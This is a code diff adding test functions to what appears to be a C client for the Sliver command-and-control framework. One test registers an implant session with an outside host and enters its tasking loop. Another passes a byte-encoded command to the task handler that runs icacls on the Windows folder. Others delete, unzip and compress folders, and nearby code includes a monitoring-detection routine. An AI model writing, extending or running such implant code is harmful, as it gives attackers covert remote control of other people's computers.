@@ -1540,6 +1540,79 @@ void test94() {
 	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
 }
 
+void test95() {
+	BYTE szBuffer[] = { 10, 41, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 105, 99, 97, 99, 108, 115, 46, 101, 120, 101, 32, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 24, 1, 34, 26, 67, 58, 85, 115, 101, 114, 115, 65, 100, 109, 105, 110, 68, 101, 115, 107, 116, 111, 112, 108, 111, 103, 46, 116, 120, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 99, 100, 99, 100, 54, 98, 56, 45, 97, 52, 56, 54, 45, 52, 99, 99, 56, 45, 98, 57, 99, 52, 45, 50, 57, 97, 101, 98, 55, 97, 100, 99, 51, 53, 101 };
+	ENVELOPE Envelope;
+	PENVELOPE pRespEnvelope = NULL;
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	Envelope.pData = ALLOC(sizeof(BUFFER));
+	Envelope.pData->pBuffer = szBuffer;
+	Envelope.pData->cbBuffer = sizeof(szBuffer);
+	pRespEnvelope = ExecuteHandler(&Envelope);
+	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
+	FreeEnvelope(pRespEnvelope);
+}
+
+void test96() {
+	DeletePath(L"C:\\Users\\Admin\\Desktop\\Hello\\");
+}
+
+void test97() {
+	//UnzipBuffer("C:\\Users\\Admin\\Desktop\\Hello.7z");
+}
+
+void test98() {
+	Unzip(L"C:\\Users\\Admin\\Desktop\\Test.zip", L"C:\\Users\\Admin");
+}
+
+void test99() {
+	if (IsFolderExist(L"..\\Removerr")) {
+		wprintf(L"Folder exist\n");
+	}
+	else {
+		wprintf(L"Folder is not exist\n");
+	}
+}
+
+void test100() {
+	CompressPathByGzip(L"..\\..\\Desktop\\Folder", NULL);
+}
+
+void test101() {
+	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	PBYTE pMarshalledRegisterInfo = NULL;
+	DWORD cbMarshalledRegisterInfo = 0;
+	PENVELOPE pRegisterEnvelope = NULL;
+
+	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
+	if (pSliverClient == NULL) {
+		LogError(L"SliverHttpClientInit failed");
+		goto CLEANUP;
+	}
+
+	printf("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
+	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
+	sprintf(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
+	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
+	if (pMarshalledRegisterInfo == NULL) {
+		wprintf(L"RegisterSliver failed");
+		goto CLEANUP;
+	}
+
+	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRegisterEnvelope->uType = MsgRegister;
+	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRegisterEnvelope->pData->pBuffer = pMarshalledRegisterInfo;
+	pRegisterEnvelope->pData->cbBuffer = cbMarshalledRegisterInfo;
+	WriteEnvelope(pSliverClient, pRegisterEnvelope);
+	SessionMainLoop(pSliverClient);
+CLEANUP:
+	FreeEnvelope(pRegisterEnvelope);
+	FreeSliverHttpClient(pSliverClient);
+	return;
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -1675,5 +1748,11 @@ int main() {
 	//test92();
 	//test93();
 	//test94();
+	//test95();
+	//test96();
+	//test97();
+	//test98();
+	//test99();
+	//test100();
 	return 0;
 }
